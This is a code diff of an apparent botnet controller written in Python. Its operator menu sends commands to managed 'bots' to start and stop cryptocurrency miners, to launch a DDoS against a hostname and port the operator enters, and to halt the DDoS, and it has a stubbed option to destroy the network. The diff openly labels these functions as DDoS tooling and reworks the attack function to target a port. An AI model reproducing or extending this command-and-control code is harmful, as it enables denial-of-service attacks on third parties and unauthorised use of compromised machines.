@@ -14,29 +14,23 @@ miner_count = 0
 clients_indexed = False
 
 
-def ping_host(addr, bytecount):
+def ping_host(addr, port):
     #DDOS tool
     if clients_indexed == True:
         manager_count = 0
         for i, manager in enumerate(manager_objects):
-            manager.start_ping(addr, bytecount)
+            manager.start_ping(addr, port)
             manager_count += 1
-        print(f'Host at {addr} pinged with {bytecount} bytes')
+        print(f'Pinging Host at {addr}:{port}')
     else:
         print('All clients need to be indexed')
 
 def stop_ping():
-    #DDOS tool
     if clients_indexed == True:
         manager_count = 0
         for i, manager in enumerate(manager_objects):
             manager.stop_ping()
             manager_count += 1
-        print(f'Host at {addr} pinged with {bytecount} bytes')
-    else:
-        print('All clients need to be indexed')
-
-
 def stop_all_miners():
     #send command to all managers to stop mining on bots
     if clients_indexed == True:
@@ -231,7 +225,7 @@ def menu():
                 if status == 'Connected':
                     os.system('cls')
                     while True:
-                        print('---Manager Menu---\n1. Get all active miners\n2. Start all miners\n3. Stop all miners\n4. Ping host\n5. Destroy whole network\n6. Back')
+                        print('---Manager Menu---\n1. Get all active miners\n2. Start all miners\n3. Stop all miners\n4. DDOS host\n5. Stop DDOS on all clients\n6. Destroy whole network\n7. Back')
                         print(f'[STATUS]: {status}')
                         inp = input('>')
                         if inp == '1':
@@ -241,14 +235,14 @@ def menu():
                         elif inp == '3':
                             stop_all_miners()
                         elif inp == '4':
-                            host = input('Enter Hostname to DDOS>')
-                            bytecount = input('Enter Bytes to send>')
-                            ping_host(host, bytecount)
-                            input('Press any button to stop pinging')
-                            stop_ping()
+                            host = input('Enter Hostname to DDOS:>')
+                            duration = input('Port to DDOS on:>')
+                            ping_host(host, duration)
                         elif inp == '5':
-                            pass
+                            stop_ping()
                         elif inp == '6':
+                            print('Not finished')
+                        elif inp == '7':
                             break
                         else:
                             print('Invalid Input.\n')
